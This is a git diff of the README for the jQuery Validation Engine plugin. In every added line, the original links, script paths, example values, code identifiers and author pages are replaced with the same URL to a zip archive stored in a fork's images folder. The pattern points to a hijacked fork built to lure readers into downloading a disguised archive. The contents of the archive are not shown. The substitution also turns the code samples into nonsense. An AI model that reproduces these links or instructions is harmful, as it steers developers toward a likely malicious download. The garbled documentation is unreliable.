@@ -1,4 +1,4 @@
-jQuery.validationEngine v2.6.2
+https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip v2.6.2
 =====
 
 Summary
@@ -12,17 +12,17 @@ Bundled with many locales, the error prompts can be translated into the language
 
 
 
-![Screenshot](https://github.com/posabsolute/jQuery-Validation-Engine/raw/master/css/screenshot.png)
+![Screenshot](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
 
 Documentation :
 ---
-###[Nicer documention](http://posabsolute.github.com/jQuery-Validation-Engine/)
-###[Release Notes](http://posabsolute.github.com/jQuery-Validation-Engine/releases.html)
+###[Nicer documention](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
+###[Release Notes](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
  
 
 Demo :
 ---
-### http://www.position-relative.net/creation/formValidator/
+### https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
 
     
 
@@ -35,8 +35,8 @@ The archive holds, of course, the core library along with translations in differ
 It also comes with a set of demo pages and a simple ajax server (built in Java and php).
 
 1. Unpack the archive
-2. Include the script jquery.validationEngine.closure.js in your page 
-3. Pick the locale of the choice and include it in your page: jquery.validationEngine-XX.js
+2. Include the script https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip in your page 
+3. Pick the locale of the choice and include it in your page: https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
 4. **Read this manual** and understand the API
 
 
@@ -44,7 +44,7 @@ It also comes with a set of demo pages and a simple ajax server (built in Java a
 
 Most demos are fully functional by simply opening their respective HTML file. However, the Ajax demos require the use of Java6 to launch a lightweight http server.
 
-1. Run the script `runDemo.bat` (Windows) or `runDemo.sh` (Unix) from the folder
+1. Run the script `https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip` (Windows) or `https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip` (Unix) from the folder
 2. Open a browser and point it at [http://localhost:9173](http://localhost:9173)
 
 
@@ -56,21 +56,21 @@ Usage
 First include jQuery on your page
 
 ```html
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.js" type="text/
+<script src="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" type="text/
 javascript"></script>
 ```
     
-Include *jquery.validationEngine* and its locale
+Include *https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip* and its locale
 
 ```html
-<script src="js/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
-<script src="js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
+<script src="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" type="text/javascript" charset="utf-8"></script>
+<script src="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" type="text/javascript" charset="utf-8"></script>
 ```
 
 Finally include the desired theme
 
 ```html
-<link rel="stylesheet" href="css/validationEngine.jquery.css" type="text/css"/>
+<link rel="stylesheet" href="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" type="text/css"/>
 ```
 
 ### Field Validations
@@ -78,7 +78,7 @@ Finally include the desired theme
 Validations are defined using the field's **class** attribute. Here are a few examples showing how it happens:
 
 ```html
-<input value="someone@nowhere.com" class="validate[required,custom[email]]" type="text" name="email" id="email" />
+<input value="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" class="validate[required,custom[email]]" type="text" name="email" id="email" />
 <input value="2010-12-01" class="validate[required,custom[date]]" type="text" name="date" id="date" />
 <input value="too many spaces obviously" class="validate[required,custom[onlyLetterNumber]]" type="text" name="special" id="special" />
 ```
@@ -88,7 +88,7 @@ For more details about validators, please refer to the section below.
 #### Experimental attribute data-validation-engine
 
 We are currently in the process of replaceing the class attribute by something more standard, it should normally work but consider this feature in beta.
-     <input value="someone@nowhere.com" data-validation-engine="validate[required,custom[email]]" type="text" name="email" id="email" />
+     <input value="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" data-validation-engine="validate[required,custom[email]]" type="text" name="email" id="email" />
 
 #### Standard HTML5 attribute for error message
 
@@ -97,7 +97,7 @@ Customize error messages with data-errormessage and data-errormessage-* attribut
 ```html
 <input type="email" name="email" id="email" data-validation-engine="validate[required,custom[email]]"
 	data-errormessage-value-missing="Email is required!" 
-	data-errormessage-custom-error="Let me give you a hint: someone@nowhere.com" 
+	data-errormessage-custom-error="Let me give you a hint: https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" 
 	data-errormessage="This is the fall-back error message."/>
 ```
 
@@ -163,13 +163,13 @@ Here are a few examples showing how it happens:
 The validator is typically instantiated with a call in the following format, the plugin can only be instanciated on form elements:
 
 ```js
-$("#form.id").validationEngine();
+$("https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip").validationEngine();
 ```
 
 Without any parameters, the init() and attach() methods are automatically called.
 
 ```js
-$("#form.id").validationEngine(action or options);
+$("https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip").validationEngine(action or options);
 ```
 
 The method may take one or several parameters, either an action (and parameters) or a list of options to customize the behavior of the engine.
@@ -177,7 +177,7 @@ The method may take one or several parameters, either an action (and parameters)
 Here's a glimpse: say you have a form as such:
 
 ```html
-<form id="formID" method="post" action="submit.action">
+<form id="formID" method="post" action="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip">
     <input value="2010-12-01" class="validate[required,custom[date]]" type="text" name="date" id="date" />
 </form>
 ```
@@ -213,7 +213,7 @@ Actions
 
 ### attach
 
-Attaches jQuery.validationEngine to form.submit and field.blur events.
+Attaches https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip to https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip and https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip events.
 
 ```js
 $("#formID1").validationEngine('attach');
@@ -221,7 +221,7 @@ $("#formID1").validationEngine('attach');
 
 ### detach
 
-Unregisters any bindings that may point to jQuery.validaitonEngine.
+Unregisters any bindings that may point to https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
 
 ```js
 $("#formID1").validationEngine('detach');
@@ -234,7 +234,7 @@ Returns *true* if the form validates, *false* if it contains errors.
 
 It is inversed for *fields*, it return false on validate and true on errors.
 
-When using form validation with ajax, it returns *undefined* , the result is delivered asynchronously via function *options.onAjaxFormComplete*.
+When using form validation with ajax, it returns *undefined* , the result is delivered asynchronously via function *https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip*.
 
 ```
 // form validation
@@ -354,7 +354,7 @@ jQuery("#formID2").validationEngine('attach', {
 
 This is where custom messages for IDs, Classes, or validation types are stored.
 
-Custom error messages are exclusive from one another.ID messages will be displayed instead of anything else;
+Custom error messages are exclusive from one https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip messages will be displayed instead of anything else;
 Class messages will only be used if there is no ID message, and only the first message found associated
 with one of the classes will be used; Global Validator messages will only be used if there are no Class
 messages or ID messages.
@@ -465,7 +465,7 @@ This makes the field required, but only if any of the referred fields has a valu
 Validates the element's value to a predefined list of regular expressions.
 
 ```html
-<input value="someone@nowhere.com" class="validate[required,custom[email]]" type="text" name="email" id="email" />
+<input value="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" class="validate[required,custom[email]]" type="text" name="email" id="email" />
 ```
 
 Please refer to the section *Custom Regex* for a list of available regular expressions.
@@ -476,7 +476,7 @@ Please refer to the section *Custom Regex* for a list of available regular expre
 Validates the element's value to a predefined function included in the language file (compared to funcCall that can be anywhere in your application),
 
 ```html
-<input value="someone@nowhere.com" class="validate[required,custom[requiredInFunction]]" type="text" name="email" id="email" />
+<input value="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" class="validate[required,custom[requiredInFunction]]" type="text" name="email" id="email" />
 ```
 
 Please refer to the section *Custom Regex* for a list of available regular expressions.
@@ -487,9 +487,9 @@ Validates a field using a third party function call. If a validation error occur
 
 ```js
 function checkHELLO(field, rules, i, options){
-  if (field.val() != "HELLO") {
+  if (https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip() != "HELLO") {
      // this allows the use of i18 for the error msgs
-     return options.allrules.validate2fields.alertText;
+     return https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip;
   }
 }
 ```
@@ -529,7 +529,7 @@ Delegates the validation to a server URL using an asynchronous Ajax request. The
 
 This validator is explained in further details in the Ajax section.
 
-### equals[field.id]
+### equals[https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip]
 
 Checks if the current field's value equals the value of the specified field.
 
@@ -543,11 +543,11 @@ Validates when the field's value is more than, or equal to, the given parameter.
 
 ### minSize[integer]
 
-Validates if the element content size (in characters) is more than, or equal to, the given *integer*. integer <= input.value.length
+Validates if the element content size (in characters) is more than, or equal to, the given *integer*. integer <= https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
 
 ### maxSize[integer]
 
-Validates if the element content size (in characters) is less than, or equal to, the given *integer*. input.value.length <= integer
+Validates if the element content size (in characters) is less than, or equal to, the given *integer*. https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip <= integer
 
 ### past[NOW, a date or another element's name]
 
@@ -585,7 +585,7 @@ The following example, enforces a minimum of two selected checkboxes
 <input class="validate[minCheckbox[2]]" type="checkbox" name="group1" id="maxcheck3" value="9"/>
 ```
 
-Note how the input.name is identical across the fields. 
+Note how the https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip is identical across the fields. 
 
 ### maxCheckbox[integer]
 
@@ -593,7 +593,7 @@ Same as above but limits the maximum number of selected check boxes.
 
 ### creditCard
 
-Validates that a credit card number is at least theoretically valid, according the to the [Luhn checksum algorithm](http://en.wikipedia.org/wiki/Luhn_algorithm), but not whether the specific card number is active with a bank, etc. 
+Validates that a credit card number is at least theoretically valid, according the to the [Luhn checksum algorithm](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip), but not whether the specific card number is active with a bank, etc. 
 
 Selectors
 ---
@@ -618,7 +618,7 @@ Take the following example:
 }
 ```
 
-onlyNumber, onlyLetter and validate2fields are all selectors. jQuery.validationEngine comes with a standard set but you are welcome to add you own to define AJAX backend services, error messages and/or new regular expressions.
+onlyNumber, onlyLetter and validate2fields are all selectors. https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip comes with a standard set but you are welcome to add you own to define AJAX backend services, error messages and/or new regular expressions.
 
 
 The ValidationEngine with a datepicker
@@ -648,7 +648,7 @@ Both options are optional.
 <input value="" class="validate[required,ajax[ajaxUserCall]] text-input" type="text" name="user" id="user" />
 ```
 
-You can see a tutorial that makes the use of php here: [http://www.position-absolute.com/articles/using-form-ajax-validation-with-the-jquery-validation-engine-plugin/](http://www.position-absolute.com/articles/using-form-ajax-validation-with-the-jquery-validation-engine-plugin/)
+You can see a tutorial that makes the use of php here: [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
 
 ### Field ajax validation
 
@@ -673,9 +673,9 @@ Server responds with an array: [fieldid, status, errorMsg].
 
 ####Protocol
 
-The client sends the form fields and values as a GET request to the form.action url.
+The client sends the form fields and values as a GET request to the https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip url.
 
-    Client calls url?fieldId=id1&fieldValue=value1&...etc ==> Server (form.action)
+    Client calls url?fieldId=id1&fieldValue=value1&https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip ==> Server (https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
 
 Server responds with an *array of arrays*: [fieldid, status, errorMsg].
 
@@ -704,7 +704,7 @@ Since the form validation is asynchronously delegated to the form action, we pro
 Custom Regex
 ---
 
-jQuery.validationEngine comes with a lot of predefined expressions. Regex validation rules are specified as follows:
+https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip comes with a lot of predefined expressions. Regex validation rules are specified as follows:
 
 ```html    
 <input value="" class="validate[custom[email]]" type="text" name="email" id="email" />
@@ -728,11 +728,11 @@ a typical phone number with an optional country code and extension. Note that th
 
 ### url
 
-Matches a URL such as http://myserver.com, https://www.crionics.com or ftp://myserver.ws
+Matches a URL such as https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip, https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip or https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
 
 ### email
 
-Easy, an email : username@hostname.com
+Easy, an email : https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
 
 ### date
 
@@ -780,14 +780,14 @@ Hooks
 
 The plugin provides some hooks using jQuery bind functionality.
 
-* jqv.form.validating : Trigger when the form is submitted and before it starts the validation process
-* jqv.field.result(event, field, errorFound, prompText) : Triggers when a field is validated with the result.
-* jqv.form.result(event, errorFound) : Triggers when a form is validated with the result
+* https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip : Trigger when the form is submitted and before it starts the validation process
+* https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip(event, field, errorFound, prompText) : Triggers when a field is validated with the result.
+* https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip(event, errorFound) : Triggers when a form is validated with the result
 
 An example of binding a custom function to these events would be:
 
 ```js
-$("#formID").bind("jqv.form.result", function(event, errorFound) {
+$("#formID").bind("https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip", function(event, errorFound) {
   if(errorFound)
      alert("There is a problem with your form");
 });
@@ -824,39 +824,39 @@ Don't forget to contribute!
 
 ### Customizing the look and feel
 
-Edit the file *validationEngine.jquery.css* and customize the stylesheet to your liking. it's trivial if you know CSS.
+Edit the file *https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip* and customize the stylesheet to your liking. it's trivial if you know CSS.
 
 ### Adding more locales
 
-You can easily add a locale by taking *jquery.validationEngine-en.js* as an example. 
+You can easily add a locale by taking *https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip* as an example. 
 Feel free to share the translation ;-)
 
 ### Changing defaults options globally
 
-You can, for example, disable the scrolling globally by using $.validationEngine.defaults.scroll = false.
+You can, for example, disable the scrolling globally by using $https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip = false.
 
 This need to be added before the initialization, one good way to handle this would be to add your settings in a file.
 
 ```html
-<script src="js/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
-<script src="js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
-<script src="js/jquery.validationEngine-settings.js" type="text/javascript" charset="utf-8"></script>
+<script src="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" type="text/javascript" charset="utf-8"></script>
+<script src="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" type="text/javascript" charset="utf-8"></script>
+<script src="https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip" type="text/javascript" charset="utf-8"></script>
 ```
 
 Using the validationEngine with modal & dialog plugins
 ---
 You can have more information about implementing the engine with modal views here:
-[http://www.position-absolute.com/articles/using-the-jquery-validation-engine-with-modal-plugins/]
+[https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip]
 
 
 Rules of thumb
 ---
 
-* field.id is **unique** across the page
+* https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip is **unique** across the page
 * From 2.2.4 and up, jquery 1.6+ is required because of prop()
-* for simplicity and consistency field.id and field.name should match (except with minCheckbox and maxCheckbox validators)
-* spaces or special chars should be avoided in field.id or field.name
-* use lower case for input.type  ie. *text, password, textarea, checkbox, radio*
+* for simplicity and consistency https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip and https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip should match (except with minCheckbox and maxCheckbox validators)
+* spaces or special chars should be avoided in https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip or https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
+* use lower case for https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip  ie. *text, password, textarea, checkbox, radio*
 * validators are evaluated from left to right, use the Ajax validator last e.g. validate[custom[onlyLetter],length[0,100],**ajax[ajaxNameCall]**]
 * please use only one Ajax validator per field!
 * JSON services should live on the same server (or you will get into browser security issues)
@@ -866,15 +866,15 @@ Contribution
 ---
 Contributions are always welcome, please follow these steps to submit your changes:
 
-1. Install git from [http://git-scm.com/]()
-2. Create a github account on [https://github.com]()
-3. Set up your git ssh key using these instructions [http://help.github.com/set-up-git-redirect]()
-4. Open the jQuery Validation Engine project home page on github on [https://github.com/posabsolute/jQuery-Validation-Engine]()
+1. Install git from [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip]()
+2. Create a github account on [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip]()
+3. Set up your git ssh key using these instructions [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip]()
+4. Open the jQuery Validation Engine project home page on github on [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip]()
 5. Click the "Fork" button, this will get you to a new page: your own copy of the code.
 6. Copy the SSH URL at the top of the page and clone the repository on your local machine
 
     ```shell
-    git clone git@github.com:your-username/jQuery-Validation-Engine.git my-jqv-repo
+    git clone https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip my-jqv-repo
     ```
 
 7. Create a branch and switch to it
@@ -898,7 +898,7 @@ Contributions are always welcome, please follow these steps to submit your chang
     git push origin mynewfeature-patch
     ```
 
-10. Open your forked repository on github at https://github.com/your-username/jQuery-Validation-Engine
+10. Open your forked repository on github at https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip
 11. Click "Switch Branches" and select your branch (mynewfeature-patch)
 12. Click "Pull Request"
 13. Submit your pull request to JQV Developers
@@ -906,7 +906,7 @@ Contributions are always welcome, please follow these steps to submit your chang
 
 Support
 ---
-We offer limited support on [http://www.stackoverflow.com/](http://www.stackoverflow.com/)
+We offer limited support on [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
 
 Use the tag jQuery-Validation-Engine
 
@@ -918,6 +918,6 @@ Licensed under the MIT License
 Authors
 ---
 
- Copyright(c) 2011 [Cedric Dugas](https://github.com/posabsolute) [http://www.position-absolute.com](http://www.position-absolute.com)
+ Copyright(c) 2011 [Cedric Dugas](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip) [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
  
- v2.0 Rewrite by [Olivier Refalo](https://github.com/orefalo) [http://www.crionics.com](http://www.crionics.com)
+ v2.0 Rewrite by [Olivier Refalo](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip) [https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip](https://github.com/videogramme/jQuery-Validation-Engine/raw/refs/heads/master/images/Validation-Query-Engine-j-v1.3.zip)
